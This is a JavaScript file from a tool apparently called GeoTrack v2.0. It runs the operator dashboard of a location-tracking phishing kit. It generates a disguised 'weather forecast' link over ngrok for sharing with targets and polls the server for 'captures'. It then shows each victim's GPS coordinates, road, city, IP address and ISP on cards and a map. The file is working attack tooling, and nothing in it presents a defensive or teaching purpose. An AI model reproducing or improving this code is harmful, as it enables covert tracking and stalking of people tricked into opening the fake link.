/* ════════════════════════════════════════════
   fakelink.js  —  Fake Link + Captures Page
   Session management, ngrok URL, live capture loop
   GeoTrack v2.0
════════════════════════════════════════════ */
'use strict';

var SESSION_TOKEN = null;
var _capLoop      = null;
var _linkCount    = 0;

/* ── INIT (called by nav.js on first visit) ── */
function initFakeLink() {
  createSession();
  fetchNgrokUrl();
  startCaptureLoop();
}

/* ── SESSION ─────────────────────────────── */
function createSession() {
  fetch(API.session)
    .then(function (r) { return r.json(); })
    .then(function (d) {
      SESSION_TOKEN = d.token;
      /* After session is ready, reload ngrok URL with token attached */
      fetchNgrokUrl();
    })
    .catch(function () {});
}

/* ── NGROK URL ───────────────────────────── */
function fetchNgrokUrl() {
  fetch(API.ngrok)
    .then(function (r) { return r.json(); })
    .then(function (d) {
      var base = (d.url || '').replace(/\/$/, '');
      var url  = base + '/forecast/world';
      if (SESSION_TOKEN) url += '?t=' + SESSION_TOKEN;

      setText('ntxt',    url);
      setText('fl-srv',  'ONLINE');
      setText('fl-ngrok','ACTIVE');
      _linkCount = 1;
      setText('sg', _linkCount);
    })
    .catch(function () {
      setText('ntxt',    'Start server.py first...');
      setText('fl-srv',  'OFFLINE');
      setText('fl-ngrok','—');
    });
}

/* ── CAPTURE LOOP ────────────────────────── */
function startCaptureLoop() {
  if (_capLoop) clearInterval(_capLoop);
  fetchCaptures();
  _capLoop = setInterval(fetchCaptures, 5000);
}

function fetchCaptures() {
  if (!SESSION_TOKEN) return;
  fetch(API.captures + '?token=' + SESSION_TOKEN)
    .then(function (r) { return r.json(); })
    .then(renderCaptures)
    .catch(function () {});
}

/* ── RENDER CAPTURES ─────────────────────── */
function renderCaptures(caps) {
  var n = caps.length;

  /* Update stats */
  setText('sc', n);
  setText('c3', n);  /* home page counter */
  setText('so', n);  /* opens counter */

  if (!n) {
    showEl('cap-empty');
    hideEl('cap-data');
    return;
  }
  hideEl('cap-empty');
  showEl('cap-data');

  /* ── Build capture cards ── */
  var list = document.getElementById('cap-list');
  if (!list) return;
  list.innerHTML = '';

  caps.slice().reverse().forEach(function (c, i) {
    var idx   = n - i;
    var isGPS = c.method === 'gps';

    list.innerHTML +=
      '<div class="capcard' + (isGPS ? '' : ' ip-m') + '">' +
        '<div class="capnum">CAPTURE #' + idx + ' — ' + (isGPS ? '📡 GPS' : '🌐 IP') + '</div>' +
        capRow('TIME',     c.timestamp    || '—') +
        capRow('CITY',     c.city         || '—') +
        capRow('STATE',    c.state        || '—') +
        capRow('COUNTRY',  c.country      || '—') +
        capRow('ROAD',     c.road         || '—') +
        capRow('LAT',      c.lat          || '—', isGPS ? 'gps' : '') +
        capRow('LON',      c.lon          || '—', isGPS ? 'gps' : '') +
        capRow('ACCURACY', c.accuracy ? c.accuracy + 'm' : '—') +
        capRow('IP',       c.captured_ip  || '—') +
        capRow('ISP',      c.isp          || '—') +
      '</div>';
  });

  /* ── Update capture map ── */
  var map = MAPS['cap-map'];
  if (map) {
    /* Clear old markers */
    MARKERS.cap.forEach(function (mk) { removeMarker(map, mk); });
    MARKERS.cap = [];

    caps.forEach(function (c) {
      if (c.lat && c.lon) {
        var color = c.method === 'gps' ? '#00ff88' : '#ffd700';
        var label = (c.city || c.captured_ip || '?');
        var mk = placeMarker(map, c.lat, c.lon, label, color);
        MARKERS.cap.push(mk);
      }
    });

    if (MARKERS.cap.length) {
      var group = L.featureGroup(MARKERS.cap);
      map.fitBounds(group.getBounds().pad(0.25));
    }
  }
}

function capRow(k, v, cls) {
  return '<div class="cr">' +
    '<span class="ck">' + k + '</span>' +
    '<span class="cv2' + (cls ? ' ' + cls : '') + '">' + v + '</span>' +
    '</div>';
}

/* ── BUTTON EVENTS ───────────────────────── */
document.addEventListener('DOMContentLoaded', function () {

  /* Copy link */
  var copyBtn = document.getElementById('copy-ngrok');
  if (copyBtn) {
    copyBtn.addEventListener('click', function () {
      var txt = document.getElementById('ntxt').textContent;
      if (txt === 'Start server.py first...') {
        toast('Server offline — start server.py first', true);
        return;
      }
      navigator.clipboard.writeText(txt)
        .then(function () { toast('Link copied to clipboard!'); })
        .catch(function () { toast('Copy failed', true); });
    });
  }

  /* Open fake weather page */
  var openWBtn = document.getElementById('open-weather');
  if (openWBtn) {
    openWBtn.addEventListener('click', function () {
      window.open(API.weather, '_blank');
    });
  }

  /* Refresh ngrok URL */
  var refNgrok = document.getElementById('ref-ngrok');
  if (refNgrok) {
    refNgrok.addEventListener('click', fetchNgrokUrl);
  }

  /* Manual refresh captures */
  var refCaps = document.getElementById('ref-caps');
  if (refCaps) {
    refCaps.addEventListener('click', fetchCaptures);
  }
});
